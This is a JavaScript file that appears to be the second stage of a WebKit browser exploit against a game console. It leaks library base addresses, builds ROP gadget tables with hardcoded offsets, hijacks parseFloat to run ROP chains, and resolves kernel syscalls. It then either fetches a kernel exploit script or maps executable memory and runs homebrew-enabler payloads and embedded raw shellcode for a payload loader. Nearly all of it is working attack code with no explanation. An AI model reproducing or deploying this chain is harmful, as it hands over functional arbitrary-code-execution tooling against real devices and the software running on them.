var p;

var print = function (x) {
  document.getElementById("console").innerText += x + "\n";
}
var print = function (string) { // like print but html
  document.getElementById("console").innerHTML += string + "\n";
}

var get_jmptgt = function (addr) {
  var z = p.read4(addr) & 0xFFFF;
  var y = p.read4(addr.add32(2));
  if (z != 0x25ff) return 0;

  return addr.add32(y + 6);
}

var gadgetmap_wk = {
  "ep": [0x5b, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0x5d, 0xc3],
  "pop rsi": [0x5e, 0xc3],
  "pop rdi": [0x5f, 0xc3],
  "pop rsp": [0x5c, 0xc3],
  "pop rax": [0x58, 0xc3],
  "pop rdx": [0x5a, 0xc3],
  "pop rcx": [0x59, 0xc3],
  "pop rsp": [0x5c, 0xc3],
  "pop rbp": [0x5d, 0xc3],
  "pop r8": [0x47, 0x58, 0xc3],
  "pop r9": [0x47, 0x59, 0xc3],
  "infloop": [0xeb, 0xfe, 0xc3],
  "ret": [0xc3],
  "mov [rdi], rsi": [0x48, 0x89, 0x37, 0xc3],
  "mov [rax], rsi": [0x48, 0x89, 0x30, 0xc3],
  "mov [rdi], rax": [0x48, 0x89, 0x07, 0xc3],
  "mov rax, rdi": [0x48, 0x89, 0xf8, 0xc3]
};

var slowpath_jop = [0x48, 0x8B, 0x7F, 0x48, 0x48, 0x8B, 0x07, 0x48, 0x8B, 0x40, 0x30, 0xFF, 0xE0];
slowpath_jop.reverse();

var gadgets;
window.stage2 = function () {
  try {
    window.stage2_();
  } catch (e) {
    print(e);
  }
}

gadgetcache = {
  "ret":                    0x0000003C,
  "jmp rax":                0x00000082,
  "ep":                     0x000000AD,
  "pop rbp":                0x000000B6,
  "mov [rdi], rax":         0x003ADAEB,
  "pop r8":                 0x000179C5,
  "pop rax":                0x000043F5,
  "mov rax, rdi":           0x000058D0,
  "mov rax, [rax]":         0x0006C83A,
  "pop rsi":                0x0008F38A,
  "pop rdi":                0x00038DBA,
  "pop rcx":                0x00052E59,
  "pop rsp":                0x0001E687,
  "mov [rdi], rsi":         0x00023AC2,
  "mov [rax], rsi":         0x00256667,
  "pop rdx":                0x001BE024,
  "pop r9":                 0x00BB320F,
  "jop":                    0x000C37D0,
  "infloop":                0x01545EAA,

  "add rax, rcx":           0x000156DB,
  "add rax, rsi":           0x001520C6,
  "and rax, rsi":           0x01570B9F,
  "mov rdx, rax":           0x00353B31,
  "mov rdi, rax":           0x015A412F,
  "mov rax, rdx":           0x001CEF20,
  "jmp rdi":                0x00295E7E,

  // Used for kernel exploit stuff
  "mov rbp, rsp":           0x000F094A,
  "mov rax, [rdi]":         0x00046EF9,
  "add rdi, rax":           0x005557DF,
  "add rax, rsi":           0x001520C6,
  "and rax, rsi":           0x01570B9F,
  "jmp rdi":                0x00295E7E,
};

window.stage2_ = function () {
  p = window.prim;

  p.leakfunc = function (func) {
    var fptr_store = p.leakval(func);
    return (p.read8(fptr_store.add32(0x18))).add32(0x40);
  }

  var parseFloatStore = p.leakfunc(parseFloat);
  var parseFloatPtr = p.read8(parseFloatStore);
  var webKitBase = p.read8(parseFloatStore);
  window.webKitBase = webKitBase;

  webKitBase.low &= 0xfffff000;
  webKitBase.sub32inplace(0x59c000 - 0x24000);

  var o2wk = function (o) {
    return webKitBase.add32(o);
  }

  gadgets = {
    "stack_chk_fail": o2wk(0xc8),
    "memset": o2wk(0x228),
    "setjmp": o2wk(0x14f8)
  };

  var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets.memset));
  libSceLibcInternalBase.low &= 0xfffff000;
  libSceLibcInternalBase.sub32inplace(0x20000);

  var libKernelBase = p.read8(get_jmptgt(gadgets.stack_chk_fail));
  window.libKernelBase = libKernelBase;
  libKernelBase.low &= 0xfffff000;
  libKernelBase.sub32inplace(0xd000 + 0x4000);

  var o2lk = function (o) {
    return libKernelBase.add32(o);
  }

  window.o2lk = o2lk;

  var wkview = new Uint8Array(0x1000);
  var wkstr = p.leakval(wkview).add32(0x10);
  var orig_wkview_buf = p.read8(wkstr);

  p.write8(wkstr, webKitBase);
  p.write4(wkstr.add32(8), 0x367c000);

  var gadgets_to_find = 0;
  var gadgetnames = [];
  for (var gadgetname in gadgetmap_wk) {
    if (gadgetmap_wk.hasOwnProperty(gadgetname)) {
      gadgets_to_find++;
      gadgetnames.push(gadgetname);
      gadgetmap_wk[gadgetname].reverse();
    }
  }

  gadgets_to_find++;

  var findgadget = function (donecb) {
    if (gadgetcache) {
      gadgets_to_find = 0;
      slowpath_jop = 0;

      for (var gadgetname in gadgetcache) {
        if (gadgetcache.hasOwnProperty(gadgetname)) {
          gadgets[gadgetname] = o2wk(gadgetcache[gadgetname]);
        }
      }
    } else {
      for (var i = 0; i < wkview.length; i++) {
        if (wkview[i] == 0xc3) {
          for (var nl = 0; nl < gadgetnames.length; nl++) {
            var found = 1;
            if (!gadgetnames[nl]) continue;
            var gadgetbytes = gadgetmap_wk[gadgetnames[nl]];
            for (var compareidx = 0; compareidx < gadgetbytes.length; compareidx++) {
              if (gadgetbytes[compareidx] != wkview[i - compareidx]) {
                found = 0;
                break;
              }
            }
            if (!found) continue;
            gadgets[gadgetnames[nl]] = o2wk(i - gadgetbytes.length + 1);
            gadgetoffs[gadgetnames[nl]] = i - gadgetbytes.length + 1;
            delete gadgetnames[nl];
            gadgets_to_find--;
          }
        } else if (wkview[i] == 0xe0 && wkview[i - 1] == 0xff && slowpath_jop) {
          var found = 1;
          for (var compareidx = 0; compareidx < slowpath_jop.length; compareidx++) {
            if (slowpath_jop[compareidx] != wkview[i - compareidx]) {
              found = 0;
              break;
            }
          }
          if (!found) continue;
          gadgets["jop"] = o2wk(i - slowpath_jop.length + 1);
          gadgetoffs["jop"] = i - slowpath_jop.length + 1;
          gadgets_to_find--;
          slowpath_jop = 0;
        }

        if (!gadgets_to_find) break;
      }
    }
    if (!gadgets_to_find && !slowpath_jop) {
      setTimeout(donecb, 50);
    } else {
      print("missing gadgets: ");
      for (var nl in gadgetnames) {
        print(" - " + gadgetnames[nl]);
      }
      if (slowpath_jop) print(" - jop gadget");
    }
  }

  findgadget(function () { });
  var hold1;
  var hold2;
  var holdz;
  var holdz1;

  while (1) {
    hold1 = { a: 0, b: 0, c: 0, d: 0 };
    hold2 = { a: 0, b: 0, c: 0, d: 0 };
    holdz1 = p.leakval(hold2);
    holdz = p.leakval(hold1);
    if (holdz.low - 0x30 == holdz1.low) break;
  }

  var pushframe = [];
  pushframe.length = 0x80;
  var funcbuf;
  var funcbuf32 = new Uint32Array(0x100);
  nogc.push(funcbuf32);

  var launch_chain = function (chain) {
    var stackPointer = 0;
    var stackCookie = 0;
    var orig_reenter_rip = 0;

    var reenter_help = {
      length: {
        valueOf: function () {
          orig_reenter_rip = p.read8(stackPointer);
          stackCookie = p.read8(stackPointer.add32(8));
          var returnToFrame = stackPointer;

          var ocnt = chain.count;
          chain.push_write8(stackPointer, orig_reenter_rip);
          chain.push_write8(stackPointer.add32(8), stackCookie);

          if (chain.runtime) returnToFrame = chain.runtime(stackPointer);

          chain.push(gadgets["pop rsp"]);
          chain.push(returnToFrame); // -> back to the trap life
          chain.count = ocnt;

          p.write8(stackPointer, (gadgets["pop rsp"])); // pop pop
          p.write8(stackPointer.add32(8), chain.stackBase); // rop rop
        }
      }
    };
    
    funcbuf = p.read8(p.leakval(funcbuf32).add32(0x10));

    p.write8(funcbuf.add32(0x30), gadgets["setjmp"]);
    p.write8(funcbuf.add32(0x80), gadgets["jop"]);
    p.write8(funcbuf, funcbuf);
    p.write8(parseFloatStore, gadgets["jop"]);
    var orig_hold = p.read8(holdz1);
    var orig_hold48 = p.read8(holdz1.add32(0x48));

    p.write8(holdz1, funcbuf.add32(0x50));
    p.write8(holdz1.add32(0x48), funcbuf);
    parseFloat(hold2, hold2, hold2, hold2, hold2, hold2);
    p.write8(holdz1, orig_hold);
    p.write8(holdz1.add32(0x48), orig_hold48);

    stackPointer = p.read8(funcbuf.add32(0x10));
    rtv = Array.prototype.splice.apply(reenter_help);
    return p.leakval(rtv);
  }

  gadgets = gadgets;
  p.loadchain = launch_chain;

  function swapkeyval(json) {
    var ret = {};
    for (var key in json) {
      if (json.hasOwnProperty(key)) {
        ret[json[key]] = key;
      }
    }
    return ret;
  }

  var kview = new Uint8Array(0x1000);
  var kstr = p.leakval(kview).add32(0x10);
  var orig_kview_buf = p.read8(kstr);

  p.write8(kstr, window.libKernelBase);
  p.write4(kstr.add32(8), 0x40000);

  var countbytes;
  for (var i = 0; i < 0x40000; i++) {
    if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
      countbytes = i;
      break;
    }
  }
  p.write4(kstr.add32(8), countbytes + 32);

  var dview32 = new Uint32Array(1);
  var dview8 = new Uint8Array(dview32.buffer);
  for (var i = 0; i < countbytes; i++) {
    if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
      dview8[0] = kview[i + 3];
      dview8[1] = kview[i + 4];
      dview8[2] = kview[i + 5];
      dview8[3] = kview[i + 6];
      var syscallno = dview32[0];
      window.syscalls[syscallno] = window.libKernelBase.add32(i);
    }
  }

  var chain = new window.rop;
  var returnvalue;

  p.fcall_ = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    chain.clear();

    chain.notimes = this.next_notime;
    this.next_notime = 1;

    chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);

    chain.push(window.gadgets["pop rdi"]);
    chain.push(chain.stackBase.add32(0x3ff8));
    chain.push(window.gadgets["mov [rdi], rax"]);

    chain.push(window.gadgets["pop rax"]);
    chain.push(p.leakval(0x41414242));

    if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
    returnvalue = p.read8(chain.stackBase.add32(0x3ff8));
  }

  p.fcall = function () {
    var rv = p.fcall_.apply(this, arguments);
    return returnvalue;
  }

  p.readstr = function (addr) {
    var addr_ = addr.add32(0);
    var rd = p.read4(addr_);
    var buf = "";
    while (rd & 0xFF) {
      buf += String.fromCharCode(rd & 0xFF);
      addr_.add32inplace(1);
      rd = p.read4(addr_);
    }
    return buf;
  }

  p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
    if (typeof sysc == "string") {
      sysc = window.syscallnames[sysc];
    }
    if (typeof sysc != "number") {
      throw new Error("invalid syscall");
    }

    var off = window.syscalls[sysc];
    if (off == undefined) {
      throw new Error("invalid syscall");
    }

    return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
  }

  p.stringify = function (str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xFF;
    }
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
  };

  p.malloc = function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  p.malloc32 = function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  }

  // Test if the kernel is already patched
  var test = p.syscall("sys_setuid", 0);

  if (test != '0') {
    // Kernel not patched, run kernel exploit
    sc = document.createElement("script");
    sc.src = "kernel.js";
    document.body.appendChild(sc);
  } else {
    // Kernel patched, launch cool stuff

    // Check mira status
    var testMira = p.syscall("sys_setlogin", p.stringify("root"))
    if(testMira != '0') {
      alert("We've updated our privacy policy in accordance with GDPR. Your trust is important to us, and we're commited to being transparent exploit developers. Press OK to begin data transfer to NSA.")

      var code_addr = new int64(0x26100000, 0x00000009);
      var buffer = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);

      // Load HEN-VTX
      if (buffer == '926100000') {
        writeHomebrewEN(p, code_addr.add32(0x100000));
      }

      // Launch HEN-VTX
      p.fcall(code_addr);

      // Zero
      for(var i = 0; i < 0x300000; i += 8)
      {
        p.write8(code_addr.add32(i), 0);
      }

      // Load Mira
      if (buffer == '926100000') {
        writeMira(p, code_addr.add32(0x100000));
      }

      // Launch Mira
      p.fcall(code_addr);

      // Test if payloads ran successfully, if not, refresh
      testMira = p.syscall("sys_setlogin", p.stringify("root"))

      if(testMira != '0')
      {
        location.reload();
      }

      // All done all done!
      allset();
    } else {
      // Load payload launcher
      var code_addr = new int64(0x26100000, 0x00000009);
      var buffer = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);

      if (buffer == '926100000') {
        try {
          var createThread = window.webKitBase.add32(0x779390);
          var shellbuf = p.malloc32(0x1000);

          var shcode = [0x31fe8948, 0x3d8b48c0, 0x00003ff4, 0xed0d8b48, 0x4800003f, 0xaaf3f929, 0xe8f78948, 0x00000060, 0x48c3c031, 0x0003c0c7, 0x89490000, 0xc3050fca, 0x06c0c748, 0x49000000, 0x050fca89, 0xc0c748c3, 0x0000001e, 0x0fca8949, 0xc748c305, 0x000061c0, 0xca894900, 0x48c3050f, 0x0068c0c7, 0x89490000, 0xc3050fca, 0x6ac0c748, 0x49000000, 0x050fca89, 0x909090c3, 0x90909090, 0x90909090, 0x90909090, 0xb8555441, 0x00003c23, 0xbed23153, 0x00000001, 0x000002bf, 0xec834800, 0x2404c610, 0x2444c610, 0x44c70201, 0x00000424, 0x89660000, 0xc6022444, 0x00082444, 0x092444c6, 0x2444c600, 0x44c6000a, 0xc6000b24, 0x000c2444, 0x0d2444c6, 0xff78e800, 0x10baffff, 0x41000000, 0x8948c489, 0xe8c789e6, 0xffffff73, 0x00000abe, 0xe7894400, 0xffff73e8, 0x31d231ff, 0xe78944f6, 0xffff40e8, 0x48c589ff, 0x200000b8, 0x00000926, 0xc300c600, 0xebc38948, 0x801f0f0c, 0x00000000, 0x01489848, 0x1000bac3, 0x89480000, 0xe8ef89de, 0xfffffef7, 0xe87fc085, 0xe8e78944, 0xfffffef8, 0xf1e8ef89, 0x48fffffe, 0x200000b8, 0x00000926, 0x48d0ff00, 0x5b10c483, 0xc35c415d, 0xc3c3c3c3];
          
          for (var i = 0; i < shcode.length; i++) {
            shellbuf.backing[i] = shcode[i];
          }

          p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
        } catch (e) { alert(e); }
      }

      // Launch loader
      p.fcall(createThread, shellbuf, 0, p.stringify("loader"));
      awaitpl();
    }
  }
}
